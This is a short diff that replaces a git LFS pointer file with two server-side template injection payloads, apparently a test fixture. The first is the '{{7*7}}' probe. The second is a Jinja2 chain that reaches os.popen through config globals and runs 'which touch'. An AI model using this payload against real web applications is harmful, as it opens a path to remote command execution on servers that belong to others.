@@ -1,3 +1,2 @@
-version https://git-lfs.github.com/spec/v1
-oid sha256:b7ba95994a3b926756f9a906bfb8295ea191abf4c14d88a085178fe3f1a3ecaf
-size 84
+{{7*7}}
+{{config.__class__.__init__.__globals__['os'].popen('which touch').read()}}
